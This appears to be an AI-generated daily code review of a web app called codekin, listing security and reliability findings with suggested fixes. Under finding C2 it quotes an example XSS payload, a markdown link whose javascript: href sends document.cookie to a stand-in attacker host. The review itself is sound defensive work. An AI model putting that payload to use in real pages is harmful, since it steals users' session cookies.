# Daily Code Review: codekin

**Date**: 2026-03-09T15:05:00.147Z
**Repository**: /srv/repos/codekin
**Branch**: main
**Workflow Run**: adc2e3ea-75ef-4b92-b458-e53ff599c834
**Session**: 263f3ec0-78c8-4cc0-b356-5b550ade2ae1

---

Now let me verify the most critical findings directly before writing the report.I now have enough verified data to produce a complete, accurate review. Here is the daily automated code review:

---

# Codekin — Daily Code Review (2026-03-09)

## Activity Summary (Last 7 Days)

Heavy UI work: mobile responsiveness, sidebar contrast fixes, docs browser, workflow enhancements, and a repo-health audit fix batch. No server-logic changes in the last 7 days. No CVEs in dependencies (`npm audit` clean on both packages).

---

## CRITICAL

### C1 — Auth token exposed in all REST API URLs
**File:** `src/lib/ccApi.ts` — lines 103, 136, 144, 153, 240, 247, 255, 263, 278, 292, 300, 308

Every REST call appends the auth token as `?token=<value>`. Tokens in URLs are captured by browser history, nginx access logs, server process logs, and any HTTP proxy. The comment at line ~318 explicitly notes WebSocket avoids this, but the REST layer does not.

```typescript
// Current (dangerous)
await authFetch(`${BASE}/api/sessions/list?token=${encodeURIComponent(token)}`)

// Fix: use Authorization header
await authFetch(`${BASE}/api/sessions/list`, {
  headers: { Authorization: `Bearer ${token}` }
})
```

This requires a corresponding change in `extractToken()` (`server/ws-server.ts:90`) to drop query-string extraction, which reduces the attack surface on the server side simultaneously.

---

### C2 — `javascript:` links not filtered in ChatView markdown
**File:** `src/components/ChatView.tsx` — line 104

`react-markdown` without `rehypeRaw` does escape raw HTML, so injecting `<script>` tags is not possible. However, `react-markdown` **does not** strip `javascript:` URIs from link `href` attributes by default. A Claude response containing:

```markdown
[Click me](javascript:fetch('https://attacker.com?c='+document.cookie))
```

...renders a live clickable XSS link. The existing `MarkdownRenderer.tsx` component (used elsewhere) already handles this with DOMPurify. ChatView should use the same protection.

**Fix:** Add a custom `a` component override in `ChatView.tsx` to sanitize `href`:

```typescript
a({ href, children, ...props }) {
  const safeHref = href?.startsWith('javascript:') ? '#' : href
  return <a href={safeHref} target="_blank" rel="noopener noreferrer" {...props}>{children}</a>
}
```

Or reuse the existing `MarkdownRenderer` component.

---

## WARNING

### W1 — Rate-limit map (`wsConnections`) never purged
**File:** `server/ws-server.ts` — lines 307–319

The IP→connection-count map grows unboundedly. Expired entries are never cleaned. On a long-running server with many unique IPs (e.g., mobile users changing addresses), this leaks memory indefinitely.

**Fix:** Add a periodic cleanup:
```typescript
setInterval(() => {
  const now = Date.now()
  for (const [ip, entry] of wsConnections) {
    if (now >= entry.resetAt) wsConnections.delete(ip)
  }
}, WS_RATE_WINDOW_MS)
```

---

### W2 — `checkAuthSession()` chains have no `.catch()` handler
**File:** `src/hooks/useChatSocket.ts` — lines 494–503, 589–598

Both reconnection-path `.then()` chains lack `.catch()`. A network error inside `checkAuthSession` causes an unhandled promise rejection, silently swallowing the error and leaving the connection in an unknown state.

```typescript
// Current
checkAuthSession().then(valid => { ... })

// Fix
checkAuthSession().then(valid => { ... }).catch(() => {
  // treat transient network errors as retriable
  reconnectTimer.current = setTimeout(connectRef.current, backoff.current)
})
```

---

### W3 — Arbitrary file type accepted in screenshot upload
**File:** `server/upload-routes.ts` — line 159 (multer config)

No `fileFilter` is set. Any file type (`.sh`, `.html`, `.svg`) can be uploaded. If uploaded files are ever served with their original MIME type, this is a stored XSS vector.

**Fix:**
```typescript
fileFilter: (_req, file, cb) => {
  const allowed = ['image/png', 'image/jpeg', 'image/gif', 'image/webp']
  cb(null, allowed.includes(file.mimetype))
}
```

---

### W4 — `requestId` from Claude process not validated before echoing
**File:** `server/session-manager.ts` — lines 486–534

`requestId` received from Claude's `control_request` event is stored and echoed back to the child process stdin without format validation. A malformed ID containing newlines or JSON metacharacters could corrupt the stdin stream.

**Fix:** Validate format before use:
```typescript
if (!/^[\w-]{1,64}$/.test(requestId)) {
  console.warn(`[control_request] Rejected invalid requestId: ${JSON.stringify(requestId)}`)
  return
}
```

---

### W5 — Event listeners accumulate across Claude process restarts
**File:** `server/session-manager.ts` — lines 391, 408–560

Each call to `wireClaudeEvents()` attaches many `cp.on()` listeners to the new `ClaudeProcess` instance. When a session restarts (line 391), the prior process's listeners are not explicitly removed. Since `ClaudeProcess` extends `EventEmitter`, the old process object may stay alive in memory holding closures over `session` state.

**Fix:** Call `cp.removeAllListeners()` (or store and remove specific listeners) when terminating the old process.

---

## INFO

### I1 — Filename length not capped in upload handler
**File:** `server/upload-routes.ts` — line 154

`file.originalname` can be arbitrarily long. A 10MB filename would be an unusual attack but worth capping:
```typescript
const safe = file.originalname.slice(0, 64).replace(/[^a-zA-Z0-9._-]/g, '_')
```

### I2 — `/auth-verify` endpoint allows unauthenticated token probing
**File:** `server/auth-routes.ts` — line 35

`POST /auth-verify` returns `{ valid: true/false }` to any caller without rate limiting. This lets an attacker brute-force token validity. Low risk if tokens are long/random, but worth adding a basic rate limit middleware or a delay on negative responses.

### I3 — DOMPurify hook registered globally in `MarkdownRenderer`
**File:** `src/components/MarkdownRenderer.tsx` — line 59

`DOMPurify.addHook()` modifies the global DOMPurify instance. If `MarkdownRenderer` is unmounted and remounted, duplicate hooks accumulate. Prefer `DOMPurify.sanitize(html, { ADD_ATTR: [...] })` options over hooks for idempotent configuration.

### I4 — No pagination for WS history replay
**File:** `server/ws-server.ts` — line 398

`outputHistory.slice(-500)` is replayed to reconnecting clients. At large message sizes, this burst can stall slow connections. Consider a max-byte cap instead of max-count.

### I5 — No test for mobile layout components
Recent mobile-responsive PRs (#57, #59) added `MobileTopBar.tsx`, sidebar drawer logic, and `useIsMobile.ts`, but there are no component tests for these paths. Given responsive layout bugs were found in back-to-back PRs, snapshot or integration tests would catch regressions earlier.

---

## Summary Table

| ID | Severity | File | Issue |
|----|----------|------|-------|
| C1 | **Critical** | `src/lib/ccApi.ts` | Auth tokens in URL query params (12 endpoints) |
| C2 | **Critical** | `src/components/ChatView.tsx` | `javascript:` links not sanitized in markdown |
| W1 | Warning | `server/ws-server.ts:307` | Rate-limit IP map never purged (memory leak) |
| W2 | Warning | `src/hooks/useChatSocket.ts:494,589` | Missing `.catch()` on auth reconnect chains |
| W3 | Warning | `server/upload-routes.ts:159` | No file-type filter on multer upload |
| W4 | Warning | `server/session-manager.ts:486` | `requestId` not validated before stdin echo |
| W5 | Warning | `server/session-manager.ts:391` | Event listeners accumulate on session restart |
| I1 | Info | `server/upload-routes.ts:154` | Filename length uncapped |
| I2 | Info | `server/auth-routes.ts:35` | `/auth-verify` unrate-limited, allows token probing |
| I3 | Info | `src/components/MarkdownRenderer.tsx:59` | DOMPurify hook registered globally |
| I4 | Info | `server/ws-server.ts:398` | History replay bounded by count, not byte size |
| I5 | Info | — | No tests for mobile layout components |

**Top recommended actions (priority order):**
1. Switch all REST API calls from `?token=` to `Authorization: Bearer` headers (C1)
2. Add `href` sanitization to ChatView's markdown `a` component (C2)
3. Add multer `fileFilter` for image-only uploads (W3)
4. Add `.catch()` to both reconnect `checkAuthSession` chains (W2)
5. Add periodic `wsConnections` map cleanup (W1)